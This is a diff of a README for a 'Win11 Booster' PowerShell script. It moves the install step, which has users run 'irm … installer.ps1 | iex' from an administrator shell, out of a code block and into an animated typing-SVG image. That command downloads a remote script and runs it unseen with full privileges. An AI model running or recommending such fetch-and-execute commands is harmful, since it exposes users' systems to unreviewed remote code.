@@ -12,14 +12,8 @@ To use the Win11 Booster script, follow the steps below:
 
 1. Open PowerShell as an administrator.
 
-2. Run the  command
+![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=800&size=16&pause=1000&color=F73FCD&repeat=false&random=false&width=435&lines=2.+Run+the++command+irm+raw.githubusercontent.com%2FScuttlang%2FWin11-Booster%2Fmain%2Finstaller.ps1+%7C+iex++)
 
-    ```powershell
-    irm raw.githubusercontent.com/Scuttlang/Win11-Booster/main/installer.ps1 | iex
-    ```
-
-
-    
 | Version |                                              |
 | ------- | --------------------------------------------- |
 | 2.1.x   | :white_check_mark: Tested - Approved- No Bug |
